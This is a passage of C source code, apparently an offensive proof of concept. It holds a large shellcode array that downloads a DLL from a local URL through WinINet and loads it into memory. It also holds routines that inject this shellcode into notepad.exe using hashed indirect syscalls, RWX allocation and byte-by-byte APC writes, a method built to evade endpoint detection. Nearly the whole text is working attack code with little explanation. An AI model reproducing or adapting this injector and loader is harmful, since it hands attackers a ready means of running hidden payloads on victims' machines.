    0xff, 0xd5, 0x48, 0x85, 0xc0, 0x75, 0x20, 0x8b, 0x55, 0x50, 0x45, 0x31,
    0xff, 0x31, 0xc9, 0x41, 0xb8, 0x00, 0x30, 0x00, 0x00, 0x41, 0xb9, 0x40,
    0x00, 0x00, 0x00, 0x41, 0xff, 0xd5, 0x48, 0x85, 0xc0, 0x0f, 0x84, 0xdb,
    0x01, 0x00, 0x00, 0x48, 0x89, 0xc6, 0x48, 0x89, 0x7c, 0x24, 0x20, 0x44,
    0x8b, 0x45, 0x54, 0x48, 0x89, 0xc1, 0x4c, 0x89, 0xe2, 0xe8, 0xe4, 0xfe,
    0xff, 0xff, 0x66, 0x83, 0x7d, 0x06, 0x00, 0x74, 0x36, 0x0f, 0xb7, 0x45,
    0x14, 0x48, 0x8d, 0x3c, 0x28, 0x48, 0x83, 0xc7, 0x18, 0x48, 0x83, 0xc7,
    0x14, 0x31, 0xdb, 0x8b, 0x4f, 0xf8, 0x44, 0x8b, 0x47, 0xfc, 0x48, 0x01,
    0xf1, 0x8b, 0x17, 0x4c, 0x01, 0xe2, 0xe8, 0xb7, 0xfe, 0xff, 0xff, 0x48,
    0xff, 0xc3, 0x0f, 0xb7, 0x45, 0x06, 0x48, 0x83, 0xc7, 0x28, 0x48, 0x39,
    0xc3, 0x72, 0xdc, 0x83, 0xbd, 0x94, 0x00, 0x00, 0x00, 0x00, 0x0f, 0x84,
    0xad, 0x00, 0x00, 0x00, 0x4c, 0x89, 0x74, 0x24, 0x30, 0x44, 0x8b, 0xb5,
    0x90, 0x00, 0x00, 0x00, 0x41, 0x8b, 0x44, 0x36, 0x0c, 0x85, 0xc0, 0x0f,
    0x84, 0x94, 0x00, 0x00, 0x00, 0x49, 0x01, 0xf6, 0x45, 0x31, 0xff, 0x41,
    0x89, 0xc5, 0x49, 0x01, 0xf5, 0x4c, 0x89, 0xe9, 0xff, 0x54, 0x24, 0x30,
    0x48, 0x85, 0xc0, 0x75, 0x13, 0x4c, 0x89, 0xe9, 0x48, 0x8b, 0x44, 0x24,
    0x20, 0xff, 0xd0, 0x48, 0x85, 0xc0, 0x0f, 0x84, 0x36, 0x01, 0x00, 0x00,
    0x49, 0x89, 0xc4, 0x41, 0x8b, 0x06, 0x41, 0x8b, 0x5e, 0x10, 0x85, 0xc0,
    0x41, 0x89, 0xdd, 0x44, 0x0f, 0x45, 0xe8, 0x49, 0x8b, 0x44, 0x35, 0x00,
    0x48, 0x85, 0xc0, 0x74, 0x3c, 0x49, 0x01, 0xf5, 0x48, 0x01, 0xf3, 0x31,
    0xff, 0x48, 0x85, 0xc0, 0x78, 0x0a, 0x48, 0x8d, 0x14, 0x30, 0x48, 0x83,
    0xc2, 0x02, 0xeb, 0x03, 0x0f, 0xb7, 0xd0, 0x4c, 0x89, 0xe1, 0xff, 0x54,
    0x24, 0x28, 0x48, 0x85, 0xc0, 0x0f, 0x84, 0xef, 0x00, 0x00, 0x00, 0x48,
    0x89, 0x04, 0x3b, 0x49, 0x8b, 0x44, 0x3d, 0x08, 0x48, 0x83, 0xc7, 0x08,
    0x48, 0x85, 0xc0, 0x75, 0xcc, 0x41, 0x8b, 0x46, 0x20, 0x49, 0x83, 0xc6,
    0x14, 0x85, 0xc0, 0x0f, 0x85, 0x72, 0xff, 0xff, 0xff, 0x48, 0x89, 0xf0,
    0x48, 0x2b, 0x45, 0x30, 0x0f, 0x84, 0x99, 0x00, 0x00, 0x00, 0x83, 0xbd,
    0xb4, 0x00, 0x00, 0x00, 0x00, 0x0f, 0x84, 0x8c, 0x00, 0x00, 0x00, 0x8b,
    0x8d, 0xb0, 0x00, 0x00, 0x00, 0x44, 0x8b, 0x5c, 0x0e, 0x04, 0x45, 0x85,
    0xdb, 0x74, 0x7c, 0x4c, 0x8d, 0x04, 0x0e, 0x4c, 0x8d, 0x0c, 0x0e, 0x49,
    0x83, 0xc1, 0x04, 0x48, 0xb9, 0xf8, 0xff, 0xff, 0xff, 0x01, 0x00, 0x00,
    0x00, 0x48, 0x8d, 0x51, 0x06, 0x4d, 0x89, 0xc2, 0x45, 0x89, 0xdb, 0x49,
    0x8d, 0x3c, 0x0b, 0x48, 0x85, 0xd7, 0x74, 0x3c, 0x48, 0xd1, 0xef, 0x41,
    0x89, 0xfb, 0x31, 0xff, 0x41, 0x0f, 0xb7, 0x5c, 0x78, 0x08, 0x41, 0x89,
    0xde, 0x41, 0x81, 0xe6, 0x00, 0xf0, 0x00, 0x00, 0x41, 0x81, 0xfe, 0x00,
    0x30, 0x00, 0x00, 0x75, 0x10, 0x81, 0xe3, 0xff, 0x0f, 0x00, 0x00, 0x45,
    0x8b, 0x30, 0x48, 0x01, 0xf3, 0x49, 0x01, 0x04, 0x1e, 0x48, 0xff, 0xc7,
    0x49, 0x39, 0xfb, 0x75, 0xcf, 0x45, 0x8b, 0x19, 0x4f, 0x8d, 0x04, 0x1a,
    0x4f, 0x8d, 0x0c, 0x1a, 0x49, 0x83, 0xc1, 0x04, 0x45, 0x8b, 0x19, 0x4d,
    0x89, 0xc2, 0x45, 0x85, 0xdb, 0x75, 0xa1, 0x8b, 0x45, 0x28, 0x48, 0x85,
    0xc0, 0x74, 0x17, 0x48, 0x01, 0xf0, 0x45, 0x31, 0xff, 0x48, 0x89, 0xf1,
    0xba, 0x01, 0x00, 0x00, 0x00, 0x45, 0x31, 0xc0, 0xff, 0xd0, 0x85, 0xc0,
    0x74, 0x08, 0x49, 0x89, 0xf7, 0xeb, 0x03, 0x45, 0x31, 0xff, 0x4c, 0x89,
    0xf8, 0x48, 0x83, 0xc4, 0x38, 0x5b, 0x5d, 0x5f, 0x5e, 0x41, 0x5c, 0x41,
    0x5d, 0x41, 0x5e, 0x41, 0x5f, 0xc3, 0xcc, 0xcc, 0x41, 0x57, 0x41, 0x56,
    0x41, 0x55, 0x41, 0x54, 0x56, 0x57, 0x55, 0x53, 0x48, 0x81, 0xec, 0x88,
    0x00, 0x00, 0x00, 0x48, 0xb8, 0x77, 0x69, 0x6e, 0x69, 0x6e, 0x65, 0x74,
    0x2e, 0x48, 0x8d, 0x74, 0x24, 0x50, 0x48, 0x89, 0x06, 0xc7, 0x46, 0x08,
    0x64, 0x6c, 0x6c, 0x00, 0x48, 0x8d, 0x5c, 0x24, 0x48, 0x66, 0xc7, 0x43,
    0x04, 0x74, 0x00, 0xc7, 0x03, 0x61, 0x67, 0x65, 0x6e, 0x0f, 0x10, 0x05,
    0x21, 0x02, 0x00, 0x00, 0x48, 0x8d, 0x7c, 0x24, 0x60, 0x0f, 0x11, 0x47,
    0x0d, 0x0f, 0x10, 0x05, 0x24, 0x02, 0x00, 0x00, 0x0f, 0x11, 0x07, 0x65,
    0x48, 0x8b, 0x04, 0x25, 0x60, 0x00, 0x00, 0x00, 0x48, 0x8b, 0x40, 0x18,
    0x48, 0x8b, 0x40, 0x20, 0x48, 0x8b, 0x00, 0x48, 0x8b, 0x00, 0x4c, 0x8b,
    0x70, 0x20, 0x48, 0x8d, 0x15, 0x3f, 0x01, 0x00, 0x00, 0x4c, 0x89, 0xf1,
    0xe8, 0xff, 0xfb, 0xff, 0xff, 0x48, 0x89, 0xf1, 0xff, 0xd0, 0x49, 0x89,
    0xc7, 0x48, 0x8d, 0x15, 0x41, 0x01, 0x00, 0x00, 0x4c, 0x89, 0xf1, 0xe8,
    0xe8, 0xfb, 0xff, 0xff, 0x49, 0x89, 0xc4, 0x48, 0x8d, 0x15, 0x3c, 0x01,
    0x00, 0x00, 0x4c, 0x89, 0xf1, 0xe8, 0xd6, 0xfb, 0xff, 0xff, 0x48, 0x89,
    0x44, 0x24, 0x40, 0x48, 0x8d, 0x15, 0x34, 0x01, 0x00, 0x00, 0x4c, 0x89,
    0xf9, 0xe8, 0xc2, 0xfb, 0xff, 0xff, 0x48, 0x89, 0xc5, 0x48, 0x8d, 0x15,
    0x30, 0x01, 0x00, 0x00, 0x4c, 0x89, 0xf9, 0xe8, 0xb0, 0xfb, 0xff, 0xff,
    0x49, 0x89, 0xc5, 0x48, 0x8d, 0x15, 0x3e, 0x01, 0x00, 0x00, 0x4c, 0x89,
    0xf9, 0xe8, 0x9e, 0xfb, 0xff, 0xff, 0x49, 0x89, 0xc6, 0x48, 0x8d, 0x15,
    0x4c, 0x01, 0x00, 0x00, 0x4c, 0x89, 0xf9, 0xe8, 0x8c, 0xfb, 0xff, 0xff,
    0x49, 0x89, 0xc7, 0x31, 0xf6, 0x89, 0x74, 0x24, 0x20, 0x48, 0x89, 0xd9,
    0xba, 0x01, 0x00, 0x00, 0x00, 0x45, 0x31, 0xc0, 0x45, 0x31, 0xc9, 0xff,
    0xd5, 0x48, 0x89, 0xc3, 0x89, 0x74, 0x24, 0x20, 0x48, 0xc7, 0x44, 0x24,
    0x28, 0x00, 0x00, 0x00, 0x00, 0x48, 0x89, 0xc1, 0x48, 0x89, 0xfa, 0x45,
    0x31, 0xc0, 0x45, 0x31, 0xc9, 0x41, 0xff, 0xd5, 0x48, 0x89, 0xc7, 0x31,
    0xc9, 0xba, 0x00, 0x00, 0x01, 0x00, 0x41, 0xb8, 0x00, 0x30, 0x00, 0x00,
    0x41, 0xb9, 0x40, 0x00, 0x00, 0x00, 0x41, 0xff, 0xd4, 0x49, 0x89, 0xc4,
    0x4c, 0x8d, 0x6c, 0x24, 0x3c, 0x41, 0x89, 0x75, 0x00, 0x89, 0xf2, 0x4c,
    0x01, 0xe2, 0x48, 0x89, 0xf9, 0x41, 0xb8, 0x00, 0x10, 0x00, 0x00, 0x4d,
    0x89, 0xe9, 0x41, 0xff, 0xd6, 0x85, 0xc0, 0x74, 0x0a, 0x8b, 0x44, 0x24,
    0x3c, 0x01, 0xc6, 0x85, 0xc0, 0x75, 0xde, 0x48, 0x89, 0xf9, 0x41, 0xff,
    0xd7, 0x48, 0x89, 0xd9, 0x41, 0xff, 0xd7, 0x4c, 0x89, 0xe1, 0xe8, 0x9f,
    0xfb, 0xff, 0xff, 0x31, 0xc9, 0xff, 0x54, 0x24, 0x40, 0x00, 0x00, 0x00,
    0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x47, 0x65, 0x74, 0x4d,
    0x6f, 0x64, 0x75, 0x6c, 0x65, 0x48, 0x61, 0x6e, 0x64, 0x6c, 0x65, 0x41,
    0x00, 0x47, 0x65, 0x74, 0x50, 0x72, 0x6f, 0x63, 0x41, 0x64, 0x64, 0x72,
    0x65, 0x73, 0x73, 0x00, 0x4c, 0x6f, 0x61, 0x64, 0x4c, 0x69, 0x62, 0x72,
    0x61, 0x72, 0x79, 0x41, 0x00, 0x77, 0x69, 0x6e, 0x69, 0x6e, 0x65, 0x74,
    0x2e, 0x64, 0x6c, 0x6c, 0x00, 0x56, 0x69, 0x72, 0x74, 0x75, 0x61, 0x6c,
    0x41, 0x6c, 0x6c, 0x6f, 0x63, 0x00, 0x45, 0x78, 0x69, 0x74, 0x50, 0x72,
    0x6f, 0x63, 0x65, 0x73, 0x73, 0x00, 0x49, 0x6e, 0x74, 0x65, 0x72, 0x6e,
    0x65, 0x74, 0x4f, 0x70, 0x65, 0x6e, 0x41, 0x00, 0x49, 0x6e, 0x74, 0x65,
    0x72, 0x6e, 0x65, 0x74, 0x4f, 0x70, 0x65, 0x6e, 0x55, 0x72, 0x6c, 0x41,
    0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00,
    0x00, 0x00, 0x00, 0x00, 0x49, 0x6e, 0x74, 0x65, 0x72, 0x6e, 0x65, 0x74,
    0x52, 0x65, 0x61, 0x64, 0x46, 0x69, 0x6c, 0x65, 0x00, 0x00, 0x00, 0x00,
    0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00,
    0x49, 0x6e, 0x74, 0x65, 0x72, 0x6e, 0x65, 0x74, 0x43, 0x6c, 0x6f, 0x73,
    0x65, 0x48, 0x61, 0x6e, 0x64, 0x6c, 0x65, 0x00, 0x61, 0x67, 0x65, 0x6e,
    0x74, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x68, 0x74, 0x74, 0x70,
    0x3a, 0x2f, 0x2f, 0x31, 0x32, 0x37, 0x2e, 0x30, 0x2e, 0x30, 0x2e, 0x31,
    0x3a, 0x35, 0x30, 0x30, 0x30, 0x2f, 0x67, 0x65, 0x74, 0x44, 0x4c, 0x4c,
    0x00, 0x00, 0x00, 0x00, 0x68, 0x74, 0x74, 0x70, 0x3a, 0x2f, 0x2f, 0x31,
    0x32, 0x37, 0x2e, 0x30, 0x2e, 0x30, 0x2e, 0x31, 0x3a, 0x35, 0x30, 0x30,
    0x30, 0x2f, 0x67, 0x65, 0x74, 0x44, 0x4c, 0x4c, 0x00, 0xcc, 0xcc, 0xcc,
    0x0e, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x0f, 0x00, 0x00, 0x00,
    0x00, 0x00, 0x00, 0x00, 0x0c, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00,
    0x0d, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x0a, 0x00, 0x00, 0x00,
    0x00, 0x00, 0x00, 0x00, 0x0b, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00,
    0x08, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x09, 0x00, 0x00, 0x00,
    0x00, 0x00, 0x00, 0x00, 0x06, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00,
    0x07, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x04, 0x00, 0x00, 0x00,
    0x00, 0x00, 0x00, 0x00, 0x05, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00,
    0x02, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x03, 0x00, 0x00, 0x00,
    0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00,
    0x01, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x80,
    0x00, 0x00, 0x00, 0x80, 0x00, 0x00, 0x00, 0x80, 0x00, 0x00, 0x00, 0x80,
    0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00,
    0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00,
    0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00,
    0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00,
    0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00,
    0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00,
    0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00
    };
    
    SIZE_T size_allocated = sizeof(shellcode);

    ////  1. find our process ////
    // lets use notepad for the poc
    HANDLE hProcess = NULL;
    DWORD pid = FindProcessId(L"notepad.exe");
    if (pid == 0) {
        printf("[-] Process not found!\n");
        return 1;
    }

    // the struct client_id is used to identify a proces with the handle of our PID
    //// 2. Open the target process with NtOpenProcess ////
    CLIENT_ID client_id;
    client_id.UniqueProcess = (HANDLE)pid;
    client_id.UniqueThread = 0;

    OBJECT_ATTRIBUTES objattr;
    // macro that initialize the objectAttributes for usd
    InitializeObjectAttributes(&objattr, NULL, 0, NULL, NULL);
    DWORD64 hash_NtOpenProcess = hashB((PCHAR)"NtOpenProcess");
    syscallAddress_NtOpenProcess = (DWORD64)(PBYTE)FindSyscallAddr(hash_NtOpenProcess);

    NTSTATUS status_NtOpenProcess = my_asm_NtOpenProcess(&hProcess, PROCESS_ALL_ACCESS, &objattr, &client_id);
    if (status_NtOpenProcess != 0) {
        printf("\n[+] open process failed. Error code: 0x%08X\n", status_NtOpenProcess);
        return 1;
    }


    //// 3. -> allocate memory on the remote process with NtAllocateVirtualMemory ////
    LPVOID remoteMemory = NULL;

    DWORD64 hash_NtAllocateVirtualMemory = hashB((PCHAR)"NtAllocateVirtualMemory");
    syscallAddress_AllocateVirtualMemory = (DWORD64)(PBYTE)FindSyscallAddr(hash_NtAllocateVirtualMemory);

    NTSTATUS status_NtAllocateVirtualMemory = my_asm_NtAllocateVirtualMemory(hProcess, &remoteMemory, 0, &size_allocated, MEM_COMMIT | MEM_RESERVE, PAGE_EXECUTE_READWRITE);
    if (status_NtAllocateVirtualMemory != 0) {
        printf("[+] Allocation in the remote process failed. Error code: 0x%08X\n", status_NtAllocateVirtualMemory);
        return 1;
    }

    //// 4. Create suspended remote thread ////
    PVOID pNtTestAlert = get_func(hashB("NtTestAlert"));
    HANDLE hThread = CreateRemoteThread(hProcess, NULL, 0, (LPTHREAD_START_ROUTINE)ExitThread, NULL, CREATE_SUSPENDED, NULL);
    if (!hThread) {
        printf("[-] Failed to create remote thread\n");
        return 1;
    }

    //// 5. -> write the shellcode in the remote process with RtlFillMemory and NtQueueApcThread ////
    PVOID pRtlFillMemory = get_func(hashB("RtlFillMemory"));

    // Queue APC to write shellcode in the remote thread //
    DWORD64 hash_NtQueueApcThread = hashB((PCHAR)"NtQueueApcThread");
    syscallAddress_NtQueueApcThread = (DWORD64)(PBYTE)FindSyscallAddr(hash_NtQueueApcThread);

    // ultra secret key (not random, we dont want RWX) //
    BYTE xor_key = 0xAA;

    // Write shellcode byte by byte using APCs //
    for (SIZE_T i = 0; i < sizeof(shellcode); ++i) {
        PVOID remote_addr = (PVOID)((ULONG_PTR)remoteMemory + i);
        UCHAR byte_value = shellcode[i] /*^ xor_key*/;

        NTSTATUS status = my_asm_NtQueueApcThread(hThread, pRtlFillMemory, remote_addr, (PVOID)1, (PVOID)(ULONG_PTR)byte_value);

        if (status != 0) {
            printf("[-] Failed to queue APC for byte %zu (0x%02X)\n", i, byte_value);
            return 1;
        }
    }
    remoteMemory = (PVOID)((uintptr_t)remoteMemory + 0xA89);
    //// 6. -> queue the APC to execute the shellcode in the remote thread ////
    NTSTATUS statusExec = my_asm_NtQueueApcThread(hThread, (PVOID)(PBYTE)(remoteMemory), NULL, NULL, NULL);
    printf("[+] Queued %zu APCs to write shellcode\n", sizeof(shellcode));


    // Resume thread
    ResumeThread(hThread);
	WaitForSingleObject(hThread, INFINITE);
    printf("[+] Thread resumed\n");

    //// clean up that shit ////
    CloseHandle(hThread);
    CloseHandle(hProcess);
    return 0;
}